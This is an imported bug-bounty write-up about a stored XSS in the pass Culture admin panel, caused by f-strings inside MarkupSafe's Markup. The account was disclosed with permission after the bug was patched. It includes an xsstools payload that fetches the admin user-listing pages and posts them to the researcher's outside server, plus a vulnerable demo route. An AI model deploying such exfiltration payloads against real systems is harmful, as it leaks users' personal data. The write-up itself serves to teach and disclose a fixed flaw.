---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-06_stored-xss-in-the-administrators-panel-due-to-misuse-of-markupsafe.md
original_filename: 2021-10-06_stored-xss-in-the-administrators-panel-due-to-misuse-of-markupsafe.md
title: Stored XSS in the administrator’s panel due to misuse of MarkupSafe
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- mobile-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- mobile-security
- supply-chain
language: en
raw_sha256: 74b92a239648f0e021837058087c495efa17dbb22c7dd27de4d798f8b66feb79
text_sha256: fcc2c4b4e739d390f86a9b4d6bca539b95f3bf9e5fcf25a57a8e81de8f1d84bf
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Stored XSS in the administrator’s panel due to misuse of MarkupSafe

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-06_stored-xss-in-the-administrators-panel-due-to-misuse-of-markupsafe.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `74b92a239648f0e021837058087c495efa17dbb22c7dd27de4d798f8b66feb79`
- Text SHA256: `fcc2c4b4e739d390f86a9b4d6bca539b95f3bf9e5fcf25a57a8e81de8f1d84bf`


## Content

---
title: "Stored XSS in the administrator’s panel due to misuse of MarkupSafe"
page_title: "[EN] Stored XSS in the administrator’s panel due to misuse of MarkupSafe"
url: "https://www.aeth.cc/public/Article-Pass-Culture/stored-xss-article-en.html"
final_url: "https://www.aeth.cc/public/Article-Pass-Culture/stored-xss-article-en.html"
authors: ["Aethlios (@AethliosIK)"]
programs: ["pass Culture"]
bugs: ["Stored XSS"]
publication_date: "2021-10-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3260
---

# __[EN] Stored XSS in the administrator’s panel due to misuse of`MarkupSafe`

Disclaimer : this exploitation was realized in a legal context of a Bug Bounty. The disclosure of the information contained in this article was made with the agreement of pass Culture and comes after a patch.  
The Bug Bounty program is not public and participation is only possible after contracting with YesWeHack and invitation by pass Culture.

![pass Culture](https://www.aeth.cc/public/Article-Pass-Culture/pass-culture.png)

## __I - Context

For the launch of the French government initiative allowing access to culture for the youngest, the public service « [pass Culture](https://pass.culture.fr/) » was able to launch a Bug Bounty program to audit its application.

The pass Culture service allows young adults over 18 years old to access a catalog of offers of shows, books, musical instruments and other digital services for a total budget of 300€.

When I received the invitation, I knew that this program would motivate me: securing the application of a public service allowing access to culture for young people makes sense to me.

Technically, I’m lucky too:

  * The source code is completely [Open Source](https://github.com/pass-culture/).
  * The Python language is used with the help of the Web Framework « [Flask](https://palletsprojects.com/p/flask/) ».
  * In addition to that, a [local deployment via docker-compose](https://github.com/pass-culture/pass-culture-main) is possible. Everything I like about the Bug Bounty.

After a first reading, three types of privileges are available on this application:

  * Young beneficiaries using the pass Culture.
  * Professionals communicating their offers.
  * The platform’s administrator accounts.

After having apprehended the mechanics of this application as a “young beneficiary”, I am confronted with solid functionalities linked to a long and complete unit test procedure.

The security of the beneficiary accounts seems strong: a beneficiary account has very few possible actions:

  * Consult the catalog of offers
  * Benefit from services and products via its budget.

Professionals wishing to propose offers to beneficiaries can create an account with many more actions available: create their structures, their stores, their offers…

A last type of privileged account exists, the administrator account, which allows to monitor the data of the accounts and manage the configurations of the platform. An account to target.

The source code is clear and unambiguous, the test procedures well done: the code seems solid but at least it is very pleasant to read.

## __II - The vulnerability

###  __II.1 - Code review

During my code review, I discovered a [misuse of anti-XSS protection](https://github.com/pass-culture/pass-culture-api/blob/8e93276c4f0e57db26f99b5aaec4791e34d177d0/src/pcapi/admin/custom_views/offer_view.py#L131) :
  
  
  def _metabase_offer_link(view, context, model, name) -> Markup:
  url = _metabase_offer_url(model.id)
  text = "Offre"
  
  return Markup(f'<a href="{url}" target="_blank" rel="noopener noreferrer">{text}</a>')
  

Within the administration panel `flask_admin` of the application, different functions `formatters` allow to decorate the data in database with a formatting.

The library [`MarkupSafe`](https://markupsafe.palletsprojects.com/en/2.0.x/) allows to escape HTML characters in output. To do this, it is used like a [printf string formatting](https://markupsafe.palletsprojects.com/en/2.0.x/formatting/#printf-style-formatting) in Python, we integrate the values to be injected in a string, then we provide the injected data. These will have to be interpreted while having correctly escaped the HTML content.

Unfortunately, in the source code of pass Culture, there is a [`f-strings` formatting](https://realpython.com/python-string-formatting/#3-string-interpolation-f-strings-python-36) inside the use of `MarkupSafe`. Thus, the injection is done before the use of Markup.

**Markup gives the illusion of protection, but no protection is in place.**

MDespite this finding, no payload injection from an account is possible. Indeed, although this bad practice is generalized to all custom formatting functions of the administration panel, all these injections do not use injectable user input…

  * Is a report worth submitting for this issue? Can’t it be considered a non-qualifying vulnerability?

_Let’s wait and see how the source code evolves with this practice…_

Every Sunday evening, a little ritual: source code review and reading the latest pass Culture commits of the week!

A script to track the evolution of this line could have been made, but it’s always good to create a code review routine: it gives a good reason to discover new features developed.

### __II.2 - The expected commit

This week, I feel like I have a [thing](https://github.com/pass-culture/pass-culture-api/commit/c8acdc5d826be668ba853b6277867e8861f92068#diff-9fd527c9fba343e8a5fc5e5c7fb6c99bd5ad28f63790818b47a49b2c925393deR140).

Indeed, from now on, the `Markup` contains the name of the `Offerer` vendor, that seems to be an injectable user input:
  
  
  def _offerer_link(view, context, model, name) -> Markup:
  offerer_id = model.venue.managingOffererId
  url = f"{settings.PRO_URL}/accueil?structure={humanize(offerer_id)}"
  text = model.venue.managingOfferer.name
  
  return Markup(f'<a href="{url}" target="_blank" rel="noopener noreferrer">{text}</a>')
  

Let’s inspect how to inject this data:

  * First, it is indeed the name of the store creating offers that is injectable, so it is a professional account that I need.
  * Second, this [page](https://github.com/pass-culture/pass-culture-api/blob/c8acdc5d826be668ba853b6277867e8861f92068/src/pcapi/admin/custom_views/offer_view.py#L155) appears to be a manual validation of new offers suspected of fraud.

So let’s look at what the criteria for fraud might be:

  * These [fraud criteria](https://github.com/pass-culture/pass-culture-api/blob/bb261b6e54126a72be3dd06eb7635f1164a5cbfb/src/pcapi/core/fraud/api.py) have no default values and must therefore be defined manually via files imported directly from the administration panel. No way to get the current criteria on the production or pre-production environment without being an application administrator in these environments.

However, the pass Culture development team offers a **great** option for any hunter: a procedure to deploy the application locally via `docker-compose`.  
What could be more generous: anyone can deploy and have control over the whole infrastructure easily. Moreover, no need to connect once the deployment is done: perfect for Bug Bounty in the middle of the [cambrousse](https://www.wordhippo.com/what-is/the-meaning-of/french-word-288e45c2a4dd5b1719cf445dc31900dad95d5a3a.html) or in the train.

So I deploy the application locally and I create a store with a classic XSS payload : `alert(1)` and a new offer with this store.  
The offer is created but it does not appear in the vulnerable manual validation page: obviously, I have not defined any rules for suspicion of fraud.

![fraud-rules](https://www.aeth.cc/public/Article-Pass-Culture/fraud-rules.png)

Well, it looks like YAML rules with no documentation.  
Instead, we’ll modify the offer, locally, in the database, to define it as fraudulent, requiring manual validation:
  
  
  pass_culture=# SELECT id,validation FROM offer WHERE id=125;
  id  |  name  | validation 
  -----+--------------+------------
  100 | offre test 1 | DRAFT
  (1 row)
  
  pass_culture=# UPDATE offer SET validation = 'PENDING' WHERE id=125;
  UPDATE 1
  pass_culture=# SELECT id,validation FROM offer WHERE id=125;
  id  |  name  | validation 
  -----+--------------+------------
  100 | offre test 1 | PENDING
  (1 row)
  

Now it pops!

![xss-alert](https://www.aeth.cc/public/Article-Pass-Culture/xss-alert.png)

### __II.3 - XSS Post-exploitation

Now, let’s forge a killer payload: for that, I use the framework of my colleague [@bitk](https://twitter.com/BitK_) : [xsstools](https://github.com/yeswehack/xsstools) which allows to forge XSS JS payloads easily and quickly (perfect for those who don’t like long native JS payloads)

With this, there is no reason to submit XSS with just a `alert` payload :

  * [xsstools presentation](https://www.youtube.com/watch?v=CNttFXupG8M)

On the admin panel, pages allow to get the names, first names, email addresses of all the accounts :

![users](https://www.aeth.cc/public/Article-Pass-Culture/users.png)

We also have a command to disable accounts from the domain name of the email addresses of the accounts. But we will not try to impact the integrity of the pre-production environment, we will limit ourselves to read-only actions.

![suspend](https://www.aeth.cc/public/Article-Pass-Culture/suspend.png)

Here is my payload : it will retrieve the content of these pages and send the JSON result in POST on my private server. Once the payload is triggered, the data will be stored in files on my server :
  
  
  import {Exfiltrators, Payload, Wrapper, utils} from "./xsstools.min.js"
  
  const exfiltrator = Exfiltrators.postJSON("http://unsafe.aeth.cc/exfiltrate.php")
  
  const payload = Payload.new()
  .addExfiltrator(exfiltrator)
  .fetchText("/pc/back-office/beneficiary_users/?page_size=10000")
  .exfiltrate()
  .fetchText("/pc/back-office/pro_users/?page_size=10000")
  .exfiltrate()
  .fetchText("/pc/back-office/partner_users/?page_size=10000")
  .exfiltrate()
  .fetchText("/pc/back-office/admin_users/?page_size=10000")
  .exfiltrate()
  .fetchText("/pc/back-office/beneficiaryimport/?page_size=10000")
  .exfiltrate()
  
  console.log(payload.run())
  

I host the obtained JS payload on my server and I create an offerer with a payload integrating the script :

![leak](https://www.aeth.cc/public/Article-Pass-Culture/leak.png)

It works, I get the data in base64 on my server.

### __II.4 - Reproduction in pre-production environment

Let’s try it in pre-production, this will ensure that the XSS works well in production context.  
I create a very suspicious offer, containing the payload that will not be injected there but to allow pass Culture to retrieve the payload used :

![offer2](https://www.aeth.cc/public/Article-Pass-Culture/offer-2.png)

My offer is pending validation, so it was suspicious enough. So I send an email to the team to ask them to accept my offer so that they can trigger the payload.

The next day, I get the response email from the team.  
I go to my server to see, they have triggered the XSS, however :
  
  
  06-04 08:42:48 pm_web-nginx_1 2021/06/04 08:42:48 [error] 7#7: *37 open() "/var/www/html/aeth.cc/unsafe/83527389922.js'" failed (2: No such file or directory), client: ***.***.***.***, server: ~^(?<sub>.*)\.aeth\.cc, request: "GET /83527389922.js' HTTP/1.1", host: "unsafe.aeth.cc"
  06-04 08:42:48 pm_web-nginx_1 04/Jun/2021:08:42:48 +0000 | unsafe.aeth.cc ***.***.***.*** "GET /83527389922.js' HTTP/1.1" 404 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
  

Beginner’s mistake, I didn’t test my payload on all browsers, especially Chrome. It triggered correctly but failed to exfiltrate the data…  
So no data leak, but the XSS was correctly triggered in the pre-production environment, I can report it!

## __III - Impacts

CVSS suggested and accepted : [CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) aka **9.9** (Critical)

  * **Privileges Required** (PR) : **Low** (L) :  
A professional account with the rights to create an offerer, a venue and an offer is required.
  * **User Interaction** (UR) : **None** (N) :  
The administrator should receive an email notification for the validation and only needs to access the usual path to trigger the XSS without anything to make him aware of it.
  * **Scope** (S) : **Changed** (C) :  
From this exploit, an attacker with a professional account can make an administrator account perform actions.
  * **Confidentiality** (C) : **High** (H) :  
All user data is leaked.
  * **Integrity** (I) : **High** (H) :  
All users and offers can be modified.
  * **Availability** (A) : **High** (H) :  
All users can be suspended.

## __IV - Remediation

As a fix, I have proposed a small script to highlight this vulnerability and suggest a possible fix:
  
  
  from flask import Flask, request
  from markupsafe import Markup
  
  app = Flask(__name__)
  
  # /unsafe?input=<script>alert(1)</script>
  @app.route('/unsafe')
  def unsafe():
  url = "https://example.com"
  # text = model.venue.managingOfferer.name
  text = request.args.get("input")
  
  return Markup(f'<a href="{url}" target="_blank" rel="noopener noreferrer">{text}</a>')
  
  # /safe?input=<script>alert(1)</script>
  @app.route('/safe')
  def safe():
  url = "https://example.com"
  # text = model.venue.managingOfferer.name
  text = request.args.get("input")
  
  return Markup('<a href="%s" target="_blank" rel="noopener noreferrer">%s</a>') % (url, text)
  

The pass Culture teams were very reactive and deployed a [fix](https://github.com/pass-culture/pass-culture-api/commit/aa10f18a0adfa2dc82a05148027bf2e899c0a2bb#) from the next day.

## __V - Timeline

  * **Submission** : 2021-06-07
  * **Under review** : 2021-06-07
  * **Acceptation** : 2021-06-07
  * **Commit with fix** : 2021-06-08
  * **Reward** (maximum reward): 2021-06-10

## __VI - Conclusion

One of the main qualities needed to do Bug Bounty without going crazy is **patience**.  
This is confirmed. If I had submitted this issue earlier, it could have finished closed without reward or qualified in **Low**.

While waiting for the vulnerability to create itself, I secured a critical vulnerability that was able to highlight a strong impact on the application.

> So let’s be patient and think **impacts** before short-term rewards.

__

  * [EN] Stored XSS in the administrator’s panel due to misuse of MarkupSafe
  * I - Context
  * II - The vulnerability
  * II.1 - Code review
  * II.2 - The expected commit
  * II.3 - XSS Post-exploitation
  * II.4 - Reproduction in pre-production environment
  * III - Impacts
  * IV - Remediation
  * V - Timeline
  * VI - Conclusion

Expand allBack to topGo to bottom

  * [EN] Stored XSS in the administrator’s panel due to misuse of MarkupSafe
  * I - Context
  * II - The vulnerability
  * II.1 - Code review
  * II.2 - The expected commit
  * II.3 - XSS Post-exploitation
  * II.4 - Reproduction in pre-production environment
  * III - Impacts
  * IV - Remediation
  * V - Timeline
  * VI - Conclusion

Expand allBack to topGo to bottom
